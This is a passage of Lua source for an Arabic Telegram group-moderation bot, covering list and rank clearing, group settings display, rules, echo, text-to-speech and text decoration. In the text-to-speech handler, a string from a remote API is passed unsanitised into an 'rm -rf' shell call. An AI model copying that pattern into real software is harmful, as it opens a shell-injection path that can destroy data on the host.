ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف المنشئين\n✓")  
DevAIAN:del(WAAD..'AIAN:Constructor:'..msg.chat_id_)
end end
if Constructor(msg) then
if txts[2] == 'المدراء' or txtss[2] == 'المدراء' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف المدراء\n✓")  
DevAIAN:del(WAAD..'AIAN:Managers:'..msg.chat_id_)
end 
if txts[2] == 'المنظفين' or txtss[2] == 'المنظفين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف المنظفين\n✓")  
DevAIAN:del(WAAD..'AIAN:Cleaner:'..msg.chat_id_)
end end
if Manager(msg) then
if txts[2] == 'الادمنيه' or txtss[2] == 'الادمنيه' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف الادمنيه\n✓")  
DevAIAN:del(WAAD..'AIAN:Admins:'..msg.chat_id_)
end
end
if txts[2] == 'قوانين' or txtss[2] == 'قوانين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف القوانين\n✓")  
DevAIAN:del(WAAD..'AIAN:rules'..msg.chat_id_)
end
if txts[2] == 'المطايه' or txtss[2] == 'المطايه' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف المطايه\n✓")  
DevAIAN:del(WAAD..'User:Donky:'..msg.chat_id_)
end
if txts[2] == 'الرابط' or txtss[2] == 'الرابط' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف رابط المجموعه\n✓")  
DevAIAN:del(WAAD.."AIAN:Groups:Links"..msg.chat_id_)
end
if txts[2] == 'المميزين' or txtss[2] == 'المميزين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف المميزين\n✓")  
DevAIAN:del(WAAD..'AIAN:VipMem:'..msg.chat_id_)
end
if txts[2] == 'المكتومين' or txtss[2] == 'المكتومين' then
DevAIAN:del(WAAD..'AIAN:Muted:'..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف المكتومين\n✓")  
end
if txts[2] == 'المقيدين' or txtss[2] == 'المقيدين' then     
local List = DevAIAN:smembers(WAAD..'AIAN:Tkeed:'..msg.chat_id_)
for k,v in pairs(List) do   
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..v.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
DevAIAN:srem(WAAD..'AIAN:Tkeed:'..msg.chat_id_, v)
end 
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف المقيدين\n✓")  
end
if txts[2] == 'قائمه المنع' or txtss[2] == 'قائمه المنع' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف قائمة المنع\n✓")  
DevAIAN:del(WAAD..'AIAN:Filters:'..msg.chat_id_)
end
if txts[2] == 'قوائم المنع' or txtss[2] == 'قوائم المنع' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف قوائم المنع\n✓")  
DevAIAN:del(WAAD..'AIAN:Filters:'..msg.chat_id_)
DevAIAN:del(WAAD.."AIAN:FilterAnimation"..msg.chat_id_)
DevAIAN:del(WAAD.."AIAN:FilterPhoto"..msg.chat_id_)
DevAIAN:del(WAAD.."AIAN:FilterSteckr"..msg.chat_id_)
end
if txts[2] == 'قائمه منع المتحركات' or txtss[2] == 'قائمه منع المتحركات' then     
DevAIAN:del(WAAD.."AIAN:FilterAnimation"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف قائمة منع المتحركات\n✓")  
end
if txts[2] == 'قائمه منع الصور' or txtss[2] == 'قائمه منع الصور' then     
DevAIAN:del(WAAD.."AIAN:FilterPhoto"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف قائمة منع الصور\n✓")  
end
if txts[2] == 'قائمه منع الملصقات' or txtss[2] == 'قائمه منع الملصقات' then     
DevAIAN:del(WAAD.."AIAN:FilterSteckr"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف قائمة منع الملصقات\n✓")  
end
end
end
--     Source WAAD     --
if text and text:match("^حذف القوائم$") and ChCheck(msg) or text and text:match("^مسح القوائم$") and ChCheck(msg) then
if not BasicConstructor(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙للمنشئ الاساسي فقط', 1, 'md')
else
local Ban = DevAIAN:smembers(WAAD..'AIAN:Ban:'..msg.chat_id_)
local Muted = DevAIAN:smembers(WAAD..'AIAN:Muted:'..msg.chat_id_)
local Tkeed = DevAIAN:smembers(WAAD..'AIAN:Tkeed:'..msg.chat_id_)
local Filters = DevAIAN:smembers(WAAD..'AIAN:Filters:'..msg.chat_id_)
local donky = DevAIAN:smembers(WAAD..'User:Donky:'..msg.chat_id_)
local HaTa = DevAIAN:smembers(WAAD..'User:HaTa:'..msg.chat_id_)
local hlo = DevAIAN:smembers(WAAD..'User:hlo:'..msg.chat_id_)
local Sakl = DevAIAN:smembers(WAAD..'User:Sakl:'..msg.chat_id_)
local Dog = DevAIAN:smembers(WAAD..'User:Dog:'..msg.chat_id_)
local Monkey = DevAIAN:smembers(WAAD..'User:Monkey:'..msg.chat_id_)
local Bakra = DevAIAN:smembers(WAAD..'User:Bakra:'..msg.chat_id_)
local Tale = DevAIAN:smembers(WAAD..'User:Tale:'..msg.chat_id_)
local Zahf = DevAIAN:smembers(WAAD..'User:Zahf:'..msg.chat_id_)
local Jred = DevAIAN:smembers(WAAD..'User:Jred:'..msg.chat_id_)
local Bro = DevAIAN:smembers(WAAD..'User:Bro:'..msg.chat_id_)
local Girl = DevAIAN:smembers(WAAD..'User:Bro:Girl'..msg.chat_id_)
if #Ban ~= 0 then Bant = 'المحظورين • ' else Bant = '' end
if #Muted ~= 0 then Mutedt = 'المكتومين • ' else Mutedt = '' end
if #Tkeed ~= 0 then Tkeedt = 'المقيدين • ' else Tkeedt = '' end
if #Filters ~= 0 then Filterst = 'قائمة المنع • ' else Filterst = '' end
if #donky ~= 0 then donkyt = 'المطايه • ' else donkyt = '' end
if #HaTa ~= 0 then HaTat = 'الحاتات • ' else HaTat = '' end
if #hlo ~= 0 then hlot = 'الصاكين • ' else hlot = '' end
if #Sakl ~= 0 then Saklt = 'الصخوله • ' else Saklt = '' end
if #Dog ~= 0 then Dogt = 'الجلاب • ' else Dogt = '' end
if #Monkey ~= 0 then Monkeyt = 'القورده • ' else Monkeyt = '' end
if #Bakra ~= 0 then Bakrat = 'البقرات • ' else Bakrat = '' end
if #Tale ~= 0 then Talet = 'الطليان • ' else Talet = '' end
if #Zahf ~= 0 then Zahft = 'الزواحف • ' else Zahft = '' end
if #Jred ~= 0 then Jredt = 'الجريذيه • ' else Jredt = '' end
if #Bro ~= 0 then Brot = 'الضلوع • ' else Brot = '' end
if #Girl ~= 0 then Girlt = 'الضلعات • ' else Girlt = '' end
if #Ban ~= 0 or #Muted ~= 0 or #Tkeed ~= 0 or #Filters ~= 0 or #donky ~= 0 or #HaTa ~= 0 or #hlo ~= 0 or #Sakl ~= 0 or #Dog ~= 0 or #Monkey ~= 0 or #Bakra ~= 0 or #Tale ~= 0 or #Zahf ~= 0 or #Jred ~= 0 or #Bro ~= 0 or #Girl ~= 0 then 
DevAIAN:del(WAAD..'AIAN:Ban:'..msg.chat_id_) 
DevAIAN:del(WAAD..'AIAN:Filters:'..msg.chat_id_) 
DevAIAN:del(WAAD..'AIAN:Muted:'..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Tkeed:'..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Cleaner:'..msg.chat_id_)
DevAIAN:del(WAAD..'User:Donky:'..msg.chat_id_)
DevAIAN:del(WAAD..'User:HaTa:'..msg.chat_id_)
DevAIAN:del(WAAD..'User:hlo:'..msg.chat_id_)
DevAIAN:del(WAAD..'User:Sakl:'..msg.chat_id_)
DevAIAN:del(WAAD..'User:Dog:'..msg.chat_id_)
DevAIAN:del(WAAD..'User:Monkey:'..msg.chat_id_)
DevAIAN:del(WAAD..'User:Bakra:'..msg.chat_id_)
DevAIAN:del(WAAD..'User:Tale:'..msg.chat_id_)
DevAIAN:del(WAAD..'User:Zahf:'..msg.chat_id_)
DevAIAN:del(WAAD..'User:Jred:'..msg.chat_id_)
DevAIAN:del(WAAD..'User:Bro:'..msg.chat_id_)
DevAIAN:del(WAAD..'User:Bro:Girl'..msg.chat_id_)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم حذف جميع القوائم التاليه ↫ ❨ "..Bant..''..Mutedt..''..Tkeedt..''..Filterst..''..donkyt..''..HaTat..''..hlot..''..Saklt..''..Dogt..''..Monkeyt..''..Bakrat..''..Talet..''..Zahft..''..Jredt..''..Brot..''..Girlt.." ❩ بنجاح \n ✓", 1, 'md')
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙لاتوجد قوائم هنا", 1, 'md')
end 
end
end
--     Source WAAD     --
if text and text:match("^حذف جميع الرتب$") and ChCheck(msg) or text and text:match("^مسح جميع الرتب$") and ChCheck(msg) or text and text:match("^تنزيل جميع الرتب$") and ChCheck(msg) then
if not AIANConstructor(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙للمالكين فقط', 1, 'md')
else
local basicconstructor = DevAIAN:smembers(WAAD..'AIAN:BasicConstructor:'..msg.chat_id_)
local constructor = DevAIAN:smembers(WAAD..'AIAN:Constructor:'..msg.chat_id_)
local Managers = DevAIAN:smembers(WAAD..'AIAN:Managers:'..msg.chat_id_)
local admins = DevAIAN:smembers(WAAD..'AIAN:Admins:'..msg.chat_id_)
local vipmem = DevAIAN:smembers(WAAD..'AIAN:VipMem:'..msg.chat_id_)
local cleaner = DevAIAN:smembers(WAAD..'AIAN:Cleaner:'..msg.chat_id_)
local donky = DevAIAN:smembers(WAAD..'User:Donky:'..msg.chat_id_)
local HaTa = DevAIAN:smembers(WAAD..'User:HaTa:'..msg.chat_id_)
local hlo = DevAIAN:smembers(WAAD..'User:hlo:'..msg.chat_id_)
local Sakl = DevAIAN:smembers(WAAD..'User:Sakl:'..msg.chat_id_)
local Dog = DevAIAN:smembers(WAAD..'User:Dog:'..msg.chat_id_)
local Monkey = DevAIAN:smembers(WAAD..'User:Monkey:'..msg.chat_id_)
local Bakra = DevAIAN:smembers(WAAD..'User:Bakra:'..msg.chat_id_)
local Tale = DevAIAN:smembers(WAAD..'User:Tale:'..msg.chat_id_)
local Zahf = DevAIAN:smembers(WAAD..'User:Zahf:'..msg.chat_id_)
local Jred = DevAIAN:smembers(WAAD..'User:Jred:'..msg.chat_id_)
local Bro = DevAIAN:smembers(WAAD..'User:Bro:'..msg.chat_id_)
local Girl = DevAIAN:smembers(WAAD..'User:Bro:Girl'..msg.chat_id_)
if #basicconstructor ~= 0 then basicconstructort = 'المنشئين الاساسيين • ' else basicconstructort = '' end
if #constructor ~= 0 then constructort = 'المنشئين • ' else constructort = '' end
if #Managers ~= 0 then Managerst = 'المدراء • ' else Managerst = '' end
if #admins ~= 0 then adminst = 'الادمنيه • ' else adminst = '' end
if #vipmem ~= 0 then vipmemt = 'المميزين • ' else vipmemt = '' end
if #cleaner ~= 0 then cleanert = 'المنظفين • ' else cleanert = '' end
if #donky ~= 0 then donkyt = 'المطايه • ' else donkyt = '' end
if #HaTa ~= 0 then HaTat = 'الحاتات • ' else HaTat = '' end
if #hlo ~= 0 then hlot = 'الصاكين • ' else hlot = '' end
if #Sakl ~= 0 then Saklt = 'الصخوله • ' else Saklt = '' end
if #Dog ~= 0 then Dogt = 'الجلاب • ' else Dogt = '' end
if #Monkey ~= 0 then Monkeyt = 'القورده • ' else Monkeyt = '' end
if #Bakra ~= 0 then Bakrat = 'البقرات • ' else Bakrat = '' end
if #Tale ~= 0 then Talet = 'الطليان • ' else Talet = '' end
if #Zahf ~= 0 then Zahft = 'الزواحف • ' else Zahft = '' end
if #Jred ~= 0 then Jredt = 'الجريذيه • ' else Jredt = '' end
if #Bro ~= 0 then Brot = 'الضلوع • ' else Brot = '' end
if #Girl ~= 0 then Girlt = 'الضلعات • ' else Girlt = '' end
if #basicconstructor ~= 0 or #constructor ~= 0 or #Managers ~= 0 or #admins ~= 0 or #vipmem ~= 0 or #cleaner ~= 0 or #donky ~= 0 or #HaTa ~= 0 or #hlo ~= 0 or #Sakl ~= 0 or #Dog ~= 0 or #Monkey ~= 0 or #Bakra ~= 0 or #Tale ~= 0 or #Zahf ~= 0 or #Jred ~= 0 or #Bro ~= 0 or #Girl ~= 0 then 
DevAIAN:del(WAAD..'AIAN:BasicConstructor:'..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Constructor:'..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Managers:'..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Admins:'..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:VipMem:'..msg.chat_id_)
DevAIAN:del(WAAD..'AIAN:Cleaner:'..msg.chat_id_)
DevAIAN:del(WAAD..'User:Donky:'..msg.chat_id_)
DevAIAN:del(WAAD..'User:HaTa:'..msg.chat_id_)
DevAIAN:del(WAAD..'User:hlo:'..msg.chat_id_)
DevAIAN:del(WAAD..'User:Sakl:'..msg.chat_id_)
DevAIAN:del(WAAD..'User:Dog:'..msg.chat_id_)
DevAIAN:del(WAAD..'User:Monkey:'..msg.chat_id_)
DevAIAN:del(WAAD..'User:Bakra:'..msg.chat_id_)
DevAIAN:del(WAAD..'User:Tale:'..msg.chat_id_)
DevAIAN:del(WAAD..'User:Zahf:'..msg.chat_id_)
DevAIAN:del(WAAD..'User:Jred:'..msg.chat_id_)
DevAIAN:del(WAAD..'User:Bro:'..msg.chat_id_)
DevAIAN:del(WAAD..'User:Bro:Girl'..msg.chat_id_)
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙تم حذف جميع الرتب التاليه ↫ ❨ "..basicconstructort..''..constructort..''..Managerst..''..adminst..''..vipmemt..''..cleanert..''..donkyt..''..HaTat..''..hlot..''..Saklt..''..Dogt..''..Monkeyt..''..Bakrat..''..Talet..''..Zahft..''..Jredt..''..Brot..''..Girlt.." ❩ بنجاح \n ✓", 1, 'md')
else
Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙لاتوجد رتب هنا", 1, 'md')
end 
end 
end
--     Source WAAD     --
if Admin(msg) then 
if text and text:match("^الاعدادات$") and ChCheck(msg) then
if not DevAIAN:get(WAAD..'AIAN:Spam:Text'..msg.chat_id_) then
spam_c = 400
else
spam_c = DevAIAN:get(WAAD..'AIAN:Spam:Text'..msg.chat_id_)
end
--     Source WAAD     --
if DevAIAN:hget(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
flood = "بالطرد"     
elseif DevAIAN:hget(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
flood = "بالتقيد"     
elseif DevAIAN:hget(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
flood = "بالكتم"           
elseif DevAIAN:hget(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
flood = "بالحذف"
else     
flood = "مفتوح"     
end
--     Source WAAD     --
if DevAIAN:get(WAAD.."AIAN:Lock:Bots"..msg.chat_id_) == "del" then
lock_bots = "بالحذف"
elseif DevAIAN:get(WAAD.."AIAN:Lock:Bots"..msg.chat_id_) == "ked" then
lock_bots = "بالتقيد"   
elseif DevAIAN:get(WAAD.."AIAN:Lock:Bots"..msg.chat_id_) == "kick" then
lock_bots = "بالطرد"    
else
lock_bots = "مفتوحه"    
end
--     Source WAAD     --
if DevAIAN:get(WAAD..'AIAN:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه'end
if DevAIAN:get(WAAD..'AIAN:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفله' else mute_photo = 'مفتوحه' end
if DevAIAN:get(WAAD..'AIAN:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفله' else mute_video = 'مفتوحه' end
if DevAIAN:get(WAAD..'AIAN:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفله' else mute_gifs = 'مفتوحه' end
if DevAIAN:get(WAAD..'AIAN:Lock:Music'..msg.chat_id_) then mute_music = 'مقفله' else mute_music = 'مفتوحه' end
if DevAIAN:get(WAAD..'AIAN:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفله' else mute_in = 'مفتوحه' end
if DevAIAN:get(WAAD..'AIAN:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفله' else mute_voice = 'مفتوحه' end
if DevAIAN:get(WAAD..'AIAN:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفله' else mute_edit = 'مفتوحه' end
if DevAIAN:get(WAAD..'AIAN:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end
if DevAIAN:get(WAAD..'AIAN:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفله' else lock_pin = 'مفتوحه' end
if DevAIAN:get(WAAD..'AIAN:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفله' else lock_sticker = 'مفتوحه' end
if DevAIAN:get(WAAD..'AIAN:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفله' else lock_tgservice = 'مفتوحه' end
if DevAIAN:get(WAAD..'AIAN:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفله' else lock_wp = 'مفتوحه' end
if DevAIAN:get(WAAD..'AIAN:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفله' else lock_htag = 'مفتوحه' end
if DevAIAN:get(WAAD..'AIAN:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفله' else lock_tag = 'مفتوحه' end
if DevAIAN:get(WAAD..'AIAN:Lock:Location'..msg.chat_id_) then lock_location = 'مقفله' else lock_location = 'مفتوحه' end
if DevAIAN:get(WAAD..'AIAN:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفله' else lock_contact = 'مفتوحه' end
if DevAIAN:get(WAAD..'AIAN:Lock:English'..msg.chat_id_) then lock_english = 'مقفله' else lock_english = 'مفتوحه' end
if DevAIAN:get(WAAD..'AIAN:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفله' else lock_arabic = 'مفتوحه' end
if DevAIAN:get(WAAD..'AIAN:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفله' else lock_forward = 'مفتوحه' end
if DevAIAN:get(WAAD..'AIAN:Lock:Document'..msg.chat_id_) then lock_file = 'مقفله' else lock_file = 'مفتوحه' end
if DevAIAN:get(WAAD..'AIAN:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفله' else markdown = 'مفتوحه' end
if DevAIAN:get(WAAD..'AIAN:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفله' else lock_spam = 'مفتوحه' end
if DevAIAN:get(WAAD..'AIAN:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفل' else lock_Join = 'مفتوح' end
if DevAIAN:get(WAAD.."AIAN:Lock:Welcome"..msg.chat_id_) then send_welcome = 'مقفله' else send_welcome = 'مفتوحه' end
if DevAIAN:get(WAAD..'AIAN:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end
if DevAIAN:get(WAAD..'AIAN:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end
if DevAIAN:get(WAAD..'AIAN:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end
if DevAIAN:get(WAAD..'AIAN:Lock:Farsi'..msg.chat_id_) then lock_farsi = 'مقفله' else lock_farsi = 'مفتوحه' end
if DevAIAN:get(WAAD..'AIAN:AIAN:Lock:Xn'..msg.chat_id_) then lock_xn = 'مفتوحه' else lock_xn = 'مقفله' end
if DevAIAN:get(WAAD..'AIAN:Lock:Clean'..msg.chat_id_) then lock_Clean = 'مفعله' else lock_Clean = 'معطله' end
local Flood_Num = DevAIAN:hget(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
local Flood_Num_Time = DevAIAN:hget(WAAD.."AIAN:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local Clean_Num = DevAIAN:get(WAAD.."AIAN:CleanNum"..msg.chat_id_,Num) or 200
--     Source WAAD     --
local TXTE = "⌯︙اعدادات المجموعه ↫ ⤈\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ \n"
.."⌯︙الروابط ↫ "..mute_links.."\n"
.."⌯︙المعرف ↫ "..lock_tag.."\n"
.."⌯︙البوتات ↫ "..lock_bots.."\n"
.."⌯︙المتحركه ↫ "..mute_gifs.."\n"
.."⌯︙الملصقات ↫ "..lock_sticker.."\n"
.."⌯︙الملفات ↫ "..lock_file.."\n"
.."⌯︙الصور ↫ "..mute_photo.."\n"
.."⌯︙الفيديو ↫ "..mute_video.."\n"
.."⌯︙الاونلاين ↫ "..mute_in.."\n"
.."⌯︙الدردشه ↫ "..mute_text.."\n"
.."⌯︙التوجيه ↫ "..lock_forward.."\n"
.."⌯︙الاغاني ↫ "..mute_music.."\n"
.."⌯︙الصوت ↫ "..mute_voice.."\n"
.."⌯︙الجهات ↫ "..lock_contact.."\n"
.."⌯︙الماركداون ↫ "..markdown.."\n"
.."⌯︙الهاشتاك ↫ "..lock_htag.."\n"
.."⌯︙التعديل ↫ "..mute_edit.."\n"
.."⌯︙التثبيت ↫ "..lock_pin.."\n"
.."⌯︙الاشعارات ↫ "..lock_tgservice.."\n"
.."⌯︙الكلايش ↫ "..lock_spam.."\n"
.."⌯︙الدخول ↫ "..lock_Join.."\n"
.."⌯︙الشبكات ↫ "..lock_wp.."\n"
.."⌯︙المواقع ↫ "..lock_location.."\n"
.."⌯︙الفشار ↫ "..lock_fshar.."\n"
.."⌯︙الاباحي ↫ "..lock_xn.."\n"
.."⌯︙الكفر ↫ "..lock_kaf.."\n"
.."⌯︙الطائفيه ↫ "..lock_taf.."\n"
.."⌯︙العربيه ↫ "..lock_arabic.."\n"
.."⌯︙الانكليزيه ↫ "..lock_english.."\n"
.."⌯︙الفارسيه ↫ "..lock_farsi.."\n"
.."⌯︙امسح ↫ "..lock_Clean.."\n"
.."⌯︙المسح التلقائي ↫ "..Clean_Num.."\n"
.."⌯︙التكرار ↫ "..flood.."\n"
.."⌯︙عدد التكرار ↫ "..Flood_Num.."\n"
.."⌯︙زمن التكرار ↫ "..Flood_Num_Time.."\n"
.."⌯︙عدد السبام ↫ "..spam_c.."\n"
.."ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ \n"
local inline = {{{text="🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .",url="t.me/CXRCX"}}}
fucktele =  msg.id_/2097152/0.5
SendInline(msg.chat_id_,TXTE,nil,inline,fucktele)
end
end
--     Source WAAD     --
if text == "تفعيل كول" and Manager(msg) and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل امر كول بنجاح")
DevAIAN:del(WAAD..'AIAN:spech:AIAN'..msg.chat_id_) 
end
if text == "تعطيل كول" and Manager(msg) and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل امر كول بنجاح")
DevAIAN:set(WAAD..'AIAN:spech:AIAN'..msg.chat_id_,true)  
end
if text and text:match("^كول (.*)$") and not DevAIAN:get(WAAD..'AIAN:spech:AIAN'..msg.chat_id_) then
local txt = {string.match(text, "^(كول) (.*)$")}
Dev_AIAN(msg.chat_id_,0, 1, txt[2], 1, 'md')
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
--     Source WAAD     --
if DevAIAN:get(WAAD..'AIAN:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم الغاء حفظ قوانين المجموعه', 1, 'md')
DevAIAN:del(WAAD..'AIAN:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevAIAN:del(WAAD..'AIAN:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
DevAIAN:set(WAAD..'AIAN:rules'..msg.chat_id_,text)
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم حفظ قوانين المجموعه', 1, 'md')
return false   
end
if text and text:match("^ضع قوانين$") and ChCheck(msg) or text and text:match("^وضع قوانين$") and ChCheck(msg) then
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙ارسل لي القوانين الان', 1, 'md')
DevAIAN:set(WAAD..'AIAN:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
end
if text and text:match("^القوانين$") then
local rules = DevAIAN:get(WAAD..'AIAN:rules'..msg.chat_id_)
Dev_AIAN(msg.chat_id_, msg.id_, 1, rules, 1, nil)
end
--     Source WAAD     --
if text == 'رقمي' and ChCheck(msg) then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
if result.phone_number_  then
MyNumber = "⌯︙رقمك ↫ +"..result.phone_number_
else
MyNumber = "⌯︙رقمك موضوع لجهات اتصالك فقط"
end
send(msg.chat_id_, msg.id_,MyNumber)
end,nil)
end
--     Source WAAD     --
if text == "تفعيل انطق" and Manager(msg) and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل ميزة انطق")
DevAIAN:del(WAAD..'AIAN:Antk:AIAN'..msg.chat_id_) 
end
if text == "تعطيل انطق" and Manager(msg) and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل ميزة انطق")
DevAIAN:set(WAAD..'AIAN:Antk:AIAN'..msg.chat_id_,true)  
end
if text and text:match("^انطق (.*)$") and not DevAIAN:get(WAAD..'AIAN:Antk:AIAN'..msg.chat_id_) and ChCheck(msg) then
local UrlAntk = https.request('https://apiabs.ml/Antk.php?AIAN='..URL.escape(text:match("^انطق (.*)$")))
Antk = JSON.decode(UrlAntk)
if UrlAntk.ok ~= false then
download_to_file("https://translate"..Antk.result.google..Antk.result.code.."UTF-8"..Antk.result.utf..Antk.result.translate.."&tl=ar-IN",Antk.result.translate..'.mp3') 
sendAudio(msg.chat_id_, msg.id_, 0, 1,nil, './'..Antk.result.translate..'.mp3')  
os.execute('rm -rf ./'..Antk.result.translate..'.mp3') 
end
end
--     Source WAAD     --
if text == "تفعيل الزخرفه" and Manager(msg) and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل الزخرفه بنجاح")
DevAIAN:del(WAAD..'AIAN:Zrf:AIAN'..msg.chat_id_) 
end
if text == "تعطيل الزخرفه" and Manager(msg) and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل الزخرفه بنجاح")
DevAIAN:set(WAAD..'AIAN:Zrf:AIAN'..msg.chat_id_,true)  
end
if DevAIAN:get(WAAD..'Zrf:AIAN'..msg.chat_id_..msg.sender_user_id_) then 
if text and text == 'الغاء' then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم الغاء امر الزخرفه', 1, 'md')
DevAIAN:del(WAAD..'Zrf:AIAN'..msg.chat_id_..msg.sender_user_id_)
return false  
end 
UrlZrf = https.request('https://apiabs.ml/zrf.php?AIAN='..URL.escape(text)) 
Zrf = JSON.decode(UrlZrf) 
t = "⌯︙قائمة الزخرفه ↫ ⤈\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."~ `"..v.."` \n"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, t, 1, 'md')
DevAIAN:del(WAAD..'Zrf:AIAN'..msg.chat_id_..msg.sender_user_id_)
return false   
end
if not DevAIAN:get(WAAD..'AIAN:Zrf:AIAN'..msg.chat_id_) then
if text == 'زخرفه' and ChCheck(msg) or text == 'الزخرفه' and ChCheck(msg) then  
DevAIAN:setex(WAAD.."Zrf:AIAN"..msg.chat_id_..msg.sender_user_id_,300,true)
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙ارسل لي الكلمه لزخرفتها \nيمكنك الزخرفة باللغه { en } ~ { ar } ', 1, 'md')
end
end
if not DevAIAN:get(WAAD..'AIAN:Zrf:AIAN'..msg.chat_id_) then
if text and text:match("^زخرفه (.*)$") and ChCheck(msg) or text and text:match("^زخرف (.*)$") and ChCheck(msg) then 
local TextZrf = text:match("^زخرفه (.*)$") or text:match("^زخرف (.*)$") 
UrlZrf = https.request('https://apiabs.ml/zrf.php?AIAN='..URL.escape(TextZrf)) 
Zrf = JSON.decode(UrlZrf) 
t = "⌯︙قائمة الزخرفه ↫ ⤈\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."~ `"..v.."` \n"
end
Dev_AIAN(msg.chat_id_, msg.id_, 1, t, 1, 'md')
end
end
--     Source WAAD     --
if text == "تفعيل الابراج" and Manager(msg) and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل الابراج بنجاح")
